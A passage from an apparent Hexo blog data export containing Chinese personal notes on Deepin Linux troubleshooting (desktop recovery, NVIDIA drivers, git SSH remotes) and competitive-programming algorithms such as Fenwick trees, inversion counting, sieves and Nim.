是没有网络的。然后其他模式又没搜到要怎么进去，到是grub图形界面有提供一个带网络的recovery模式，不过我没有grub图形界面</li>\n<li>就搜了搜在single模式联网——按照定义，single模式是没有网络的。然后联网后install dde，中途flatpak提示desktopRecord.service不存在，然后错误处理ctrl-c了dde的安装过程。然后后来按照dde的安装信息提示安装其他组件console-setup，然后使用sudo apt-get install –reinstall dde修复了dde的安装（apt -f在这里是没用的）</li>\n<li>不知道为什么中途提示proxychain 的配置文件修改了</li>\n<li>本来想着要是没网，就下个lightdm 来安装，结果没有binary的文件，装不了。</li>\n<li>后来安装好dde后startx老是说成功退出——没有任何报错信息，都是成功，连退出都是成功退出，但是就是不符合我的预期</li>\n</ul>\n<h3 id=\"查看glibc版本\"><a href=\"#查看glibc版本\" class=\"headerlink\" title=\"查看glibc版本\"></a>查看glibc版本</h3><ul>\n<li><code>ldd --version</code></li>\n<li><code>getconf GNU_LIBC_VERSION</code></li>\n</ul>\n<h3 id=\"shell使用-时的SIGPIPE\"><a href=\"#shell使用-时的SIGPIPE\" class=\"headerlink\" title=\"shell使用|时的SIGPIPE\"></a>shell使用<code>|</code>时的SIGPIPE</h3><ul>\n<li>比如<code>proc_1 | proc_2</code>，如果第二个进程关闭，第一个就会管道破裂，如果没有处理就会die</li>\n</ul>\n<h3 id=\"安装nvidia驱动\"><a href=\"#安装nvidia驱动\" class=\"headerlink\" title=\"安装nvidia驱动\"></a>安装nvidia驱动</h3><ul>\n<li>在nvidia官网下程序</li>\n<li><code>telinit 3</code>关掉<code>X server</code>（或者是systemctl stop lightdm.service）</li>\n<li><p>安装过程中需要编译内核模块，编译时使用的gcc版本要与编译内核的gcc版本一致</p>\n <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ cat /proc/version</span><br><span class=\"line\">Linux version 4.15.0-29deepin-generic (pbuilder@zs-PC) (gcc version 7.3.0 (Debian 7.3.0-19)) #31 SMP Fri Jul 27 07:12:08 UTC 2018</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>安装时，如果有驱动占用了gpu，那么会失败，在<code>/etc/modprobe.d/</code>加一个文件（命名为<code>*.conf</code>）</p>\n <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">blacklist nouveau</span><br><span class=\"line\">blacklist rivafb</span><br><span class=\"line\">blacklist rivatv</span><br><span class=\"line\">blacklist nvidiafb</span><br><span class=\"line\"></span><br><span class=\"line\"># 下面这几条应该可以不用，我不加也成功</span><br><span class=\"line\">options nouveau modeset=0 </span><br><span class=\"line\">options rivafb modeset=0</span><br><span class=\"line\">options rivatv modeset=0</span><br><span class=\"line\">options nvidiafb modeset=0</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>安装过程中我一开始选使用dkms，但是失败，后来没选，也失败了几次，所以不清楚dkms的情况</p>\n</li>\n<li>安装后要运行<code>nvidia-xconfig</code>配置<code>/etc/X11/xorg.conf</code>，或者自己手动配置（然而我这里一直失败，一加相关的东西就启动卡住，而且也没有报错信息——我们又看其他信息，不知道其他信息有没有提示）</li>\n<li>然而。事情没那么简单，我装了nvidia驱动后，deepin-wm cpu占用率飙升，nvidia-smi看不到使用gpu的进程，gg。没办法，卸了驱动，删了blacklist</li>\n<li>后来发现deepin有个gpu driver manager，运行后，跑了很久，重启后还跑了很久，还看到一堆error，然后还开一个渲染画面让我看看渲染得咋样，然后后来启动成功，nvidia-smi也看到有deepin-wm的进程跑在gpu上，deepin-wm的cpu占用率也没有飙升，还行</li>\n</ul>\n<h3 id=\"Tilix-dont-inherit-the-directory\"><a href=\"#Tilix-dont-inherit-the-directory\" class=\"headerlink\" title=\"Tilix dont inherit the directory\"></a>Tilix dont inherit the directory</h3><ul>\n<li><a href=\"https://github.com/gnunn1/tilix/wiki/VTE-Configuration-Issue\" target=\"_blank\" rel=\"noopener\">The VTE matter this</a></li>\n</ul>\n<h3 id=\"sogouPinyin候选框异常解决方法\"><a href=\"#sogouPinyin候选框异常解决方法\" class=\"headerlink\" title=\"sogouPinyin候选框异常解决方法\"></a>sogouPinyin候选框异常解决方法</h3><ul>\n<li>其实也不算解决，我在配置文件里把所有能关掉skin的选项都关了，sougou还是不使用fcitx的skin，删了<code>~/.config</code>下面的sogou相关配置文件也没用</li>\n<li>后来发现，如果有其他输入法一起，然后切换过其他输入法，sogoupinyin的皮肤就跟那个输入法的一样（也不知道是不是一样，我的fcitx不能切换皮肤，所有只有一个皮肤）</li>\n</ul>\n<h3 id=\"cache的详细信息（包括相联度，电压等）\"><a href=\"#cache的详细信息（包括相联度，电压等）\" class=\"headerlink\" title=\"cache的详细信息（包括相联度，电压等）\"></a>cache的详细信息（包括相联度，电压等）</h3><ul>\n<li><code>sudo dmidecode -t 7</code></li>\n<li><code>getconf -a | grep CACHE</code></li>\n</ul>\n<h3 id=\"设置默认浏览器\"><a href=\"#设置默认浏览器\" class=\"headerlink\" title=\"设置默认浏览器\"></a>设置默认浏览器</h3><ul>\n<li><code>xdg-settings set default-web-browser chrome.desktop</code></li>\n<li><code>xdg-settings get default-web-browser</code>获取值</li>\n<li>关于desktop文件的<code>Exec</code>段中的后缀，<a href=\"https://specifications.freedesktop.org/desktop-entry-spec/latest/ar01s07.html\" target=\"_blank\" rel=\"noopener\">doc</a><blockquote>\n<p>%i    The Icon key of the desktop entry expanded as two arguments, first –icon and then the value of the Icon key. Should not expand to any arguments if the Icon key is empty or missing.<br>%c    The translated name of the application as listed in the appropriate Name key in the desktop entry.<br>%k    The location of the desktop file as either a URI (if for example gotten from the vfolder system) or a local filename or empty if no location is known.<br>%f    A single file name (including the path), even if multiple files are selected. The system reading the desktop entry should recognize that the program in question cannot handle multiple file arguments, and it should should probably spawn and execute multiple copies of a program for each selected file if the program is not able to handle additional file arguments. If files are not on the local file system (i.e. are on HTTP or FTP locations), the files will be copied to the local file system and %f will be expanded to point at the temporary file. Used for programs that do not understand the URL syntax.<br>%F    A list of files. Use for apps that can open several local files at once. Each file is passed as a separate argument to the executable program.<br>%u    A single URL. Local files may either be passed as file: URLs or as file path.<br>%U    A list of URLs. Each URL is passed as a separate argument to the executable program. Local files may either be passed as file: URLs or as file path.</p>\n</blockquote>\n</li>\n</ul>\n<h3 id=\"github账户有设置ssh但是仓库push还是要用户密码的解决方法\"><a href=\"#github账户有设置ssh但是仓库push还是要用户密码的解决方法\" class=\"headerlink\" title=\"github账户有设置ssh但是仓库push还是要用户密码的解决方法\"></a>github账户有设置ssh但是仓库push还是要用户密码的解决方法</h3><ul>\n<li>这是因为remote add时使用的是https，而不是ssh</li>\n<li><code>git remote -v</code>可以看到是https链接</li>\n<li><code>git remote set-url origin git@github.com:USERNAME/REPOSITORY.git</code>改为ssh</li>\n<li><a href=\"https://help.github.com/articles/changing-a-remote-s-url/\" target=\"_blank\" rel=\"noopener\">参考</a></li>\n</ul>\n","slug":"My-ITOPS-Note","categories":[{"name":"运维","slug":"运维","permalink":"https://h-zex.github.io/categories/运维/"}],"tags":[{"name":"ITOps","slug":"ITOps","permalink":"https://h-zex.github.io/tags/ITOps/"}]},{"title":"My ACM Note","date":"2018-02-02T05:31:40.000Z","path":"2018/02/02/My-ACM-Note/","text":"全源最短路径的一种错误解法 错误代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758int main() &#123; while (~scanf(\"%d\", &amp;N)) &#123; // assume that if no edge i-&gt;j, then input w[i][j] will be INF // and assume that w[i][i] == 0 FWD(i, 0, N) &#123; FWD(j, 0, N) &#123; scanf(\"%d\", &amp;w[i][j]); &#125; &#125; memset(dp, 0xff, sizeof(dp)); FWD(i, 0, N) &#123; FWD(j, 0, N) &#123; // if i == j, dfs can still return true answer dfs(i, j); &#125; &#125; FWD(i, 0, N) &#123; FWD(j, 0, N) &#123; printf(\"%15d\", dp[i][j]); &#125; printf(\"\\n\"); &#125; &#125;&#125;bool visit[MAXV];int __dfs(int now, int target);int dfs(int from, int target) &#123; memset(visit, 0, sizeof(visit)); visit[from] = true; return __dfs(from, target);&#125;int __dfs(int now, int target) &#123; if (dp[now][target] &gt; -1) &#123; return dp[now][target]; &#125; if (now == target) &#123; dp[now][target] = 0; return 0; // visit[now] will never be true; &#125; int ans = INF; FWD(i, 0, N) &#123; if (visit[i] || w[now][i] == INF || i==now) &#123; // avoid rings and not edge continue; &#125; visit[i] = true; int p = __dfs(i, target) + w[now][i]; visit[i] = false; if (p &lt; ans) &#123; NEXT[now][target] = i; // record the NEXT vertex of i in the shortest path now-&gt;target ans = p; &#125; &#125; dp[now][target] = ans; return ans;&#125; 不可以使用这种dp 对于每对点执行dfs，然后执行过程中，记忆化搜索。当然，为了避免执行过程出现不断的走环路的情况，需要使用visit，避免dfs过程中走环路。 虽然复杂度是$O(V^3)$ ，但是算法是错的 记忆化搜索计算$(begin,target)$ 时，假设dfs过程中经过了点i ，为了避免环，i不可以经过begin，但是，可能$(i,target)$ 的最优路径就是i经过点begin 到达的。 但是，记忆化过程中，却把在dfs$(begin,target)$过程中 计算出来的$(i,target)$ 作为i 到target 的结果。 NYOJ7 题目描述:一个街区有很多住户，街区的街道只能为东西、南北两种方向。住户只可以沿着街道行走。各个街道之间的间隔相等。用(x,y)来表示住户坐在的街区。例如（4,20），表示用户在东西方向第4个街道，南北方向第20个街道。现在要建一个邮局，使得各个住户到邮局的距离之和最少。求现在这个邮局应该建在那个地方使得所有住户距离之和最小； 输入描述:1234&gt; 第一行一个整数n&lt;20，表示有n组测试数据，下面是n组数据;&gt; 每组第一行一个整数m&lt;20,表示本组有m个住户，下面的m行每行有两个整数0&lt;x,y&lt;100，表示某个用户所在街区的坐标。&gt; m行后是新一组的数据；&gt; 输出描述:12&gt; 每组数据输出到邮局最小的距离和，回车结束；&gt; 样例输入:123456789101112&gt; 2&gt; 3&gt; 1 1&gt; 2 1&gt; 1 2&gt; 5&gt; 2 9 &gt; 5 20&gt; 11 9&gt; 1 1&gt; 1 20&gt; 样例输出:123&gt; 2&gt; 44&gt; 考虑横坐标的情况，取那个横坐标可以使得大家的在横坐标上需要走的距离最短？显然是中位数——反证法，加入有N个点，如果N是奇数，那么中位数就是d[N/2]，然后，尝试采用第N/2-1个点计算，显然，总量的变化是（设 t = d[N/2]-d[N/2-1] ），$+t(N/2+1)-tN/2$ ，也就是缩短的对于前N/2的用户来说，是缩短了，但是对于后面N/2+1个用户来说延长了 所以，无论y坐标取值多少，x坐标都要取中位数。同理，y也要取中位数 01背包 动态规划算法是伪多项式复杂度$O(NW)$，如果W很大，那么可能，直接枚举N元素的集合的所有子集会更快一些 找出一个序列中任意长度的逆序对 首先定义什么是逆序对：比如一个序列是从小到大排列的，那么如果$x_i&gt;x_{i+1}&gt;x_{i+2}&gt;…$那么就是逆序对 主要思路是，对于n元逆序对，flag数组中的index表示某个序列中的某个等于index的数，而flag[index]的值表示以这个index结尾的n-1元的逆序对的数量 假设序列有n个数，数的范围是[0, MAX], 首先搞一个int flag[MAX+1], 该数组的所有值初始化为0，还有一个int result[n] 首先看看如何求二元逆序对 从左到右扫描序列，对于值位置为i的值x，flag[x]+=1 然后此时，以该x结尾的逆序对的数量就是$\\sum_{j=x+1}^{MAX}flag[j]$，将这个数量记录在result[i] 那么result的数组的和就是逆序对的数量 同样的，在刚才flag[x]+=1的步骤，可以输出后面的数与x组成的序对来输出具体的逆序对 三元组的，我们已经用上面的方法求出二元的result数组(此处将其记为result_2数组)，此时设另外的两个数组int flag_3[MAX+1], int result_3[n]; 同样扫描序列，对于位置为i的数x，取出result_2[i]的值，也就是以该x结尾的二元组逆序对的数量m，然后flag_3[x]+=m。此时flag_3[x]记录了截止目前，以x结尾的二元组逆序对的数量 求$\\sum_{j=x+1}^{MAX}flag_3[j]$，得到以x结尾的三元组逆序对的数量，记录在result_3[i]中 到最后，result_3就是结果 更多元组的也如此思路 这是利用数组记录了当前已经有的数，然后新加入的数如果不是该数组中当前index最大的，那么意味着其比之前加入的一些数小，这就形成了逆序对 对于n元逆序对，同理，数组记录了当前已有的数x作为最后一个元素是x的n-1元逆序对的逆序对的数量，然后如果我们往该数组加入一个数，然后这个数不是index最大的，那么其比之前已经加入的一些数小，从而与比他大的数代表的n-1元逆序对形成了更长的逆序对 然后，既然这其中，对数组求和很重要，我们就可以利用树状数组优化这个往flag[x]中增加数值然后求和计算出对应result[i]的过程（原始序对中第i位的值是x） 3p另一种思路：针对三元逆序对，还有一种简单的解法，先把数据按顺序插入，用树形数组记录此时比这个数大的数的数目x，再把数据倒着插入，用另一个树形数组记录此时比这个数小的数的数目y，x*y=以这个数为中心的三元逆数对数目，把各个数计算累计起来即可（来自17级大佬Potatso） 关于使用优先队列的bfs 其实就是dijstra单源最短路径算法 关于O((V+E)lgV)：对每个点都需要从堆中pop出来（除了源点），对于每条边，都需要把该边对应的一个点压进堆里或者decrease key，consider that，如果一个点被pop出来，那么该点就在result set里，所以不会再被压到堆里。所以是O((V+E)lgV)，如果使用斐波那契堆，因为压到堆里以及decrease key的代价是O(1)，所以是O(VlgV+E) DP DP要找到什么因素影响了当前你要求的东西，有影响的我们就处理，没影响的我们不用管 浮点数输入 由于是二进制，所以有些十进制有限小数成了无限的，所以读取时会截断，所以要加上一个偏移量（比如读入到小数点后6位，可以加一个$2*10^{-7}$，这样，截断部分如果比较大，就可以反映出来，如果比较小，不会对产生进位，则没影响） 枚举所有素数 $O(N)$ 的做法 123456789101112const int CNT = (int)1e9+10;bool a[CNT];int main() &#123; a[0] = a[1] = true; FWD(i, 2, CNT) &#123; if (a[i]) &#123; continue; &#125; for (int j = 2 * i; j &lt; CNT; j += i) &#123; a[j] = true; &#125; &#125; 树状数组 注意，a[0]是没有放东西的，因为$i-lowbit(i)+1 &gt; 0$ 插线问点中，每一点 i 的值都是 sum(a[1] to a[i])。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859//NYOJ 123int c[1000010],N;int lowbit(int x) //求最低位1的位置所表示的数&#123; return x&amp;(-x);&#125;void update(int p,int q)//常规数组中的a[p]更新，在树状数组中需要这样更新&#123; while(p&lt;=N) &#123; c[p]+=q; p+=lowbit(p); &#125;&#125;int S(int x) //S(i)表示的是的前i个数的和&#123; int sum=0; while(x&gt;0) &#123; sum+=c[x]; cout&lt;&lt;\"sum: \"&lt;&lt;sum&lt;&lt;\" \"; x-=lowbit(x); &#125; cout&lt;&lt;endl; return sum;&#125;int main()&#123; int T; char s[10]; scanf(\"%d%d\",&amp;T,&amp;N); while(T--)&#123; scanf(\"%s\",s); if(s[0]=='A')&#123; int l,r,num; scanf(\"%d%d%d\",&amp;l,&amp;r,&amp;num); update(l,num); update(r+1,-num); //每个士兵 i 的军功都是前 i 个元素的和，所以，[l, m]区间每个人加 num 的军功只需要给 //l 位置加上num，这样，[l, N]区间的每个人都加上了 num ，但是，我们只要[l, m]，所以要 //给 m+1 位置减去num, &#125; else &#123; int x; scanf(\"%d\",&amp;x); printf(\"%d\\n\",S(x)); for(int i=0;i&lt;=x;i++) &#123; cout&lt;&lt;c[i]&lt;&lt;\" \"; &#125; cout&lt;&lt;endl; for(int i=0;i&lt;=x;i++) &#123; cout&lt;&lt;S(i)&lt;&lt;\" \"; &#125; cout&lt;&lt;endl; &#125; &#125; return 0;&#125; 离散化 图形面积，解答 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include&lt;iostream&gt;#include &lt;algorithm&gt;#include&lt;string.h&gt;#include&lt;cstdio&gt;#include&lt;math.h&gt;using namespace std;double x[201],y[201],s[101][4];int xy[201][201];int n,cas=0;double sum;int main()&#123; int i,j,k; while(cin&gt;&gt;n) &#123; if(n==0) break; cas++; k=0; sum=0.0; memset(xy,0,sizeof(xy)); for(i=1;i&lt;=n;i++) &#123; cin&gt;&gt;s[i][0]&gt;&gt;s[i][1]&gt;&gt;s[i][2]&gt;&gt;s[i][3]; x[k]=s[i][0]; y[k]=s[i][1]; k++; x[k]=s[i][2]; y[k]=s[i][3]; k++; &#125; sort(x,x+2*n); sort(y,y+2*n); for (int i=1;i&lt;=n;i++) &#123; int i1=lower_bound(x,x+2*n,s[i][0])-x;//二分查找，跟普通的FOR语句一样 int j1=lower_bound(y,y+2*n,s[i][1])-y; int i2=lower_bound(x,x+2*n,s[i][2])-x; int j2=lower_bound(y,y+2*n,s[i][3])-y; for (int p1=i1;p1&lt;i2;p1++) //标记状态，记住我们是以一个方块的角标记状态所以p1&lt;i2，不是&lt;= for (int p=j1;p&lt;j2;p++) xy[p1][p]=1; &#125; for (int i=0;i&lt;2*n;i++)//统计 for (int j=0;j&lt;2*n;j++) if (xy[i][j]) &#123; sum+=(x[i+1]-x[i])*(y[j+1]-y[j]); &#125; printf(\"Test case #%d\\n\",cas); printf(\"Total explored area: %.2f\\n\",sum); printf(\"\\n\"); &#125; return 0;&#125; 其实就是，把坐标间的距离都忽略掉，把坐标的集中在一起，一个挨着一个，然后遍历整个标记区域，某个单元格有标记说明该位置两边都对应地存在两个坐标（原始数据中的），则只需要知道这两个原始数据中的坐标相差多远，就可以知道这个标记代表着多大的面积。 POJ3278 N是人的位置，K是牛的位置 一种lgN的做法 如果N的二进制大于等于K的二进制，则直接走x-1法 否则，想办法修改N的二进制使得其与K的二进制的最高几位重合，然后接下来的二进制就直接用x2和+1来实现（二进制位为0则x2，为1则+1） 假设K与N重合的二进制部分为W 如果W&lt;N，可以消减N使得N==W，也可以N乘以多次2然后减去一些1使得N与新的W相同（因为随着N×2，其与K重合的最高二进制位变多，所以说是新的W） 如果W&gt;N，可以先进行多次加一使得重合，或者是多次×2后多次-1使得重合 即使W小于N，也有可能先乘以几次2后在进行几次-1比较高效（因为可能后面很多个1，导致如果直接消减W） 总结起来就是，构造W与N相同的过程中，可以对N乘以一次2、两次2…P次2，对于每种乘2，减去或加上一些1使得重合，然后再计算在此基础上需要的时间 也就是不断试错的过程 子集和问题的动态规划解法 如果只是要求出是否有一个解法，或者是要求出有多少个解法，那么动态规划可行 子集和问题变形 问题：给定一个正整数M和另一个K，要求求出M切分成K份，每份都是正整数的解法有多少。同样可以动态规划 floyd求最小环 最小环的定义：在有向或是无向的简单图中在找到一条路径，其从点x到点x，总的权重最小。（不可以直接x到x，在无向图中也不可以利用x到y，y到x，因为如果可以这样，意味着多重边或是使用同一条边） 如果可以确定w[x][x] = INF，那么floyd然后找到最小的w[x][x]既可。 否则，不可以通过使得所有的w[x][x]变为INF来实现，因为floyd过程中，会使用到 查询第K大 如果是静态数组，多次查询，直接一个sort 如果是静态数组，一次查询，算导中那个快排变体，$O(N)$ 如果是动态数组，字典树——每个数以二进制表示，构造字典树，字典树的node需要维护当前node为root的子树的叶子数目，从而在任意一个非叶子节点，可以选择要走那条路下去——可以算出，二进制比x进制更快 Nim游戏（博弈论） 定义P-position和N-position，其中P代表Previous，N代表Next。直观的说，上一次move的人有必胜策略的局面是P-position，也就是“后手可保证必胜”或者“先手必败”，现在轮到move的人有必胜策略的局面是N-position，也就是“先手可保证必胜”。更严谨的定义是：1.无法进行任何移动的局面（也就是terminal position）是P-position；2.可以移动到P-position的局面是N-position；3.所有移动都导致N-position的局面是P-position。 P-position需要保证所有子格局都是N-position，N-position只要找到第一个子格局是P-position即可。 通过数学归纳法，两堆石子的情况下，两堆相等是P-position 如果局面不可能重现，或者说positions的集合可以进行拓扑排序，那么每个position或者是P-position或者是N-position，而且可以通过定义计算出来。 HDU3483[题意]输入n, x, m ，求$(1^x)(x^1)+(2^x)(x^2)+(3^x)(x^3)+…+(n^x)(x^n)$ [解题方法]设$f[n] = [x^n, n(x^n), (n^2)(x^n),…, (n^x)(x^n)]$，则$f[n][k] = (n^k)(x^n)$，问题转化为求：$(g[n] = f[1][x]+f[2][x]+…+f[n][x])$，设C(i,j)为组合数，即i种元素取j种的方法数，所以有：$$f[n+1][k] = ((n+1)^k)(x^(n+1)) \\text{（二次多项式展开）}\\ = x( C(k,0)(x^n)+C(k,1)n(x^n)+…+C(k,k)(n^k)(x^n))\\= x(C(k,0)f[n][0]+C(k,1)f[n][1]+…+C(k,k)*f[n][k])​$$所以得： 12345678|x*1 0................................0| |f[n][0]| |f[n+1][0]| |x*1 x*1 0............................0| |f[n][1]| |f[n+1][1]| |x*1 x*2 x*1 0........................0| * |f[n][2]| = |f[n+1][2]| |......................................| |.......| |.........| |x*1 x*C(k,1) x*C(k,2)...x*C(k,x) 0...0| |f[n][k]| |f[n+1][k]| |......................................| |.......| |.........| |x*1 x*C(x,1) x*C(x,2).......x*C(x,x) 0| |f[n][x]| |f[n+1][x]| |0................................0 1 1| |g[n-1] | | g[ n ] | KMP算法理解预处理算法 预处理出来的第 $i$ 位结果 $p[i]$ 是原字符串截止到第 $i$ 那个字符的最小周期，也就是只需要移动最少量的字符 $p[i]$ 既可以使得原先匹配部分再次匹配起来。 为什么偶数长度的回文数字串不是primer ref Because even length prime digit numbers are divisible by 11 therefore are not prime.It’s a trick that has to do powers of 10 and mod 11.Ex: 10 = 10^1 mod 11 = -1 mod 11​ $100 = 10^2 = 1 \\mod 11$​ $1000 = 10^3 = -1 \\mod 11$​ $10000 = 10^4 = 1 \\mod 11$See the pattern?Even exponent powers of 10 are 1 mod 11Odd exponent powers of 10 are -1 mod 11. We also know decimal numbers are just base 10 expansion of the digits. So $1225 = (10^3)1 + 2(10^2) + 2(10^1) + 5(10^0).$​ using modular arithmetic we can say, 1225 MOD 11 = (-1)*1 + 2*(1) + 2*(-1) + 5*(1) = -1 + 2 + 2 + 5 = 8. In other words, in MOD 11 we calculate what a decimal number is by just alternating the addition and subtraction across the digits. Another example. $1323412 \\mod 11 = 1 -3 +2 -3 +4 -1 +2\\mod 11 = 0.$ Then it becomes why it is quite obvious why the above logic works for even palindromes. Example: $321123 = -3 + 2 - 1 + 1 -2 + 3 = 0$. All the numbers cancel out with each other. 贪心算法总结 在每个贪心算法后面几乎总有一个DP解法 如何证明是否可以用贪心算法求解一个问题？并没有通用方法，但是贪心选择性质和最优子结构是两个关键要素 如果贪心选择时需要考虑众多选择，通常意味着可以改进贪心选择来获得更高效的解法 贪心选择性质 可以通过做出局部最优的选择来构造全局最优 证明方法：首先考察某个子问题的最优解，然后用贪心选择替换某个其他选择来修改此解，从而得到一个相似但是更小的子问题 一组有效的步骤 确定问题的最优子结构（如果一个问题的最优解包含其子问题的最优解，则称此问题具有最优子结构性质） 设计一个递归解法（该递归解法加上记忆就可以变成自顶向下的DP） 证明如果做出一个贪心选择，就只剩下一个子问题（或许可能是几个子问题？不过子问题的数量确实要比自顶向下的DP解法少） 证明贪心选择总是安全的 什么是安全的？ 做出贪心选择后，原问题总存在最优解，即贪心选择总是安全的 做出贪心选择后，剩余的子问题满足性质：其最优解与贪心选择组合即可得到原问题的最优解，这样就得到了最优子结构 设计一个递归算法实现贪心策略 把递归算法转为迭代算法 一组简化的步骤 将最优化问题转为这样的形式：做出一次选择后，只剩下一个子问题需要求解 证明做出贪心选择后，原问题总存在最优解，即贪心选择总是安全的 证明做出贪心选择后，剩余的子问题满足性质：其最优解与贪心选择组合即可得到原问题的最优解，这样就得到了最优子结构","raw":"---\ntitle: My ACM Note\ndate: 2018-02-02 13:31:40\ntags:\n- ACM\n- note\ncategories:\n- 算法\n---\n\n### 全源最短路径的一种错误解法\n\n- 错误代码\n\n  ```cpp\n  \n  int main() {\n      while (~scanf(\"%d\", &N)) {\n          // assume that if no edge i->j, then input w[i][j] will be INF\n          // and assume that w[i][i] == 0\n          FWD(i, 0, N) {\n              FWD(j, 0, N) {\n                  scanf(\"%d\", &w[i][j]);\n              }\n          }\n          memset(dp, 0xff, sizeof(dp));\n          FWD(i, 0, N) {\n              FWD(j, 0, N) {\n                  // if i == j, dfs can still return true answer\n                  dfs(i, j);\n              }\n          }\n          FWD(i, 0, N) {\n              FWD(j, 0, N) {\n                  printf(\"%15d\", dp[i][j]);\n              }\n              printf(\"\\n\");\n          }\n      }\n  }\n  \n  bool visit[MAXV];\n  int __dfs(int now, int target);\n  int dfs(int from, int target) {\n      memset(visit, 0, sizeof(visit));\n      visit[from] = true;\n      return __dfs(from, target);\n  }\n  \n  int __dfs(int now, int target) {\n      if (dp[now][target] > -1) {\n          return dp[now][target];\n      }\n      if (now == target) {\n          dp[now][target] = 0;\n          return 0; // visit[now] will never be true;\n      }\n      int ans = INF;\n      FWD(i, 0, N) {\n          if (visit[i] || w[now][i] == INF || i==now) { // avoid rings and not edge\n              continue;\n          }\n          visit[i] = true;\n          int p = __dfs(i, target) + w[now][i];\n          visit[i] = false;\n          if (p < ans) {\n              NEXT[now][target] = i; // record the NEXT vertex of i in the shortest path now->target\n              ans = p;\n          }\n      }\n      dp[now][target] = ans;\n      return ans;\n  }\n  ```\n\n- 不可以使用这种dp\n\n- 对于每对点执行dfs，然后执行过程中，记忆化搜索。当然，为了避免执行过程出现不断的走环路的情况，需要使用visit，避免dfs过程中走环路。\n\n- 虽然复杂度是$O(V^3)$ ，但是算法是错的\n\n- 记忆化搜索计算$(begin,target)$ 时，假设dfs过程中经过了点`i` ，为了避免环，`i`不可以经过`begin`，但是，可能$(i,target)$ 的最优路径就是`i`经过点`begin` 到达的。\n\n- 但是，记忆化过程中，却把在dfs$(begin,target)$过程中 计算出来的$(i,target)$ 作为`i` 到`target` 的结果。\n\n### NYOJ7\n\n> ##### 题目描述:\n>\n> 一个街区有很多住户，街区的街道只能为东西、南北两种方向。\n> 住户只可以沿着街道行走。\n> 各个街道之间的间隔相等。\n> 用(x,y)来表示住户坐在的街区。\n> 例如（4,20），表示用户在东西方向第4个街道，南北方向第20个街道。\n> 现在要建一个邮局，使得各个住户到邮局的距离之和最少。\n> 求现在这个邮局应该建在那个地方使得所有住户距离之和最小；\n>\n> ##### 输入描述:\n>\n> ```\n> 第一行一个整数n<20，表示有n组测试数据，下面是n组数据;\n> 每组第一行一个整数m<20,表示本组有m个住户，下面的m行每行有两个整数0<x,y<100，表示某个用户所在街区的坐标。\n> m行后是新一组的数据；\n> ```\n>\n> ##### 输出描述:\n>\n> ```\n> 每组数据输出到邮局最小的距离和，回车结束；\n> ```\n>\n> ##### 样例输入:\n>\n> ```\n> 2\n> 3\n> 1 1\n> 2 1\n> 1 2\n> 5\n> 2 9 \n> 5 20\n> 11 9\n> 1 1\n> 1 20\n> ```\n>\n> ##### 样例输出:\n>\n> ```\n> 2\n> 44\n> ```\n\n- 考虑横坐标的情况，取那个横坐标可以使得大家的在横坐标上需要走的距离最短？显然是中位数——反证法，加入有N个点，如果N是奇数，那么中位数就是d[N/2]，然后，尝试采用第N/2-1个点计算，显然，总量的变化是（设 t = d[N/2]-d[N/2-1] ），$+t*(N/2+1)-t*N/2$ ，也就是缩短的对于前N/2的用户来说，是缩短了，但是对于后面N/2+1个用户来说延长了\n- 所以，无论y坐标取值多少，x坐标都要取中位数。同理，y也要取中位数\n\n### 01背包\n\n- 动态规划算法是伪多项式复杂度$O(NW)$，如果W很大，那么可能，直接枚举N元素的集合的所有子集会更快一些\n\n### 找出一个序列中任意长度的逆序对\n\n- 首先定义什么是逆序对：比如一个序列是从小到大排列的，那么如果$x_i>x_{i+1}>x_{i+2}>...$那么就是逆序对\n- 主要思路是，对于n元逆序对，flag数组中的index表示某个序列中的某个等于index的数，而flag[index]的值表示以这个index结尾的n-1元的逆序对的数量\n- 假设序列有n个数，数的范围是[0, MAX], 首先搞一个int flag[MAX+1], 该数组的所有值初始化为0，还有一个int result[n]\n- 首先看看如何求二元逆序对\n   - 从左到右扫描序列，对于值位置为`i`的值`x`，flag[x]+=1\n   - 然后此时，以该x结尾的逆序对的数量就是$\\sum_{j=x+1}^{MAX}flag[j]$，将这个数量记录在result[i]\n   - 那么result的数组的和就是逆序对的数量\n   - 同样的，在刚才flag[x]+=1的步骤，可以输出后面的数与x组成的序对来输出具体的逆序对\n- 三元组的，我们已经用上面的方法求出二元的result数组(此处将其记为result\\_2数组)，此时设另外的两个数组int flag\\_3[MAX+1], int result_3[n];\n   - 同样扫描序列，对于位置为`i`的数`x`，取出result\\_2[i]的值，也就是以该x结尾的二元组逆序对的数量m，然后flag_3[x]+=m。此时flag\\_3[x]记录了截止目前，以x结尾的二元组逆序对的数量\n   - 求$\\sum_{j=x+1}^{MAX}flag\\_3[j]$，得到以x结尾的三元组逆序对的数量，记录在result_3[i]中\n   - 到最后，result_3就是结果\n- 更多元组的也如此思路\n- 这是利用数组记录了当前已经有的数，然后新加入的数如果不是该数组中当前index最大的，那么意味着其比之前加入的一些数小，这就形成了逆序对\n- 对于n元逆序对，同理，数组记录了当前已有的数`x`作为`最后一个元素是x的n-1元逆序对`的逆序对的数量，然后如果我们往该数组加入一个数，然后这个数不是index最大的，那么其比之前已经加入的一些数小，从而与`比他大的数代表的n-1元逆序对`形成了更长的逆序对\n- 然后，既然这其中，对数组求和很重要，我们就可以利用树状数组优化这个往flag[x]中增加数值然后求和计算出对应result[i]的过程（原始序对中第`i`位的值是`x`）\n\n> 3p另一种思路：针对三元逆序对，还有一种简单的解法，先把数据按顺序插入，用树形数组记录此时比这个数大的数的数目x，再把数据倒着插入，用另一个树形数组记录此时比这个数小的数的数目y，x*y=以这个数为中心的三元逆数对数目，把各个数计算累计起来即可（来自17级大佬Potatso）\n\n### 关于使用优先队列的bfs\n\n- 其实就是dijstra单源最短路径算法\n- 